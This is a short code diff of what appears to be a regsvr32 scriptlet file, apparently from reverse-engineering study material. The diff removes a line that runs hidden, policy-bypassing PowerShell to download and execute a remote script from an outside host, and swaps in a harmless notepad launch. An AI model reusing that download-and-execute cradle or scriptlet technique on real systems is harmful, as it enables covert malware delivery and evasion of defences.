@@ -6,7 +6,7 @@ classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 <script language="JScript">
  
 <![CDATA[   
-var c= 'powershell.exe -w hidden -ep Bypass -nologo -noprofile "IEX ((new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/phamphuqui1998/RE_basic/master/TestPS/Test_regsvr32.ps1\'))"'; 
+var c= 'notepad.exe'; 
 new ActiveXObject("WScript.Shell").Run(c,0);
 ]]>
  
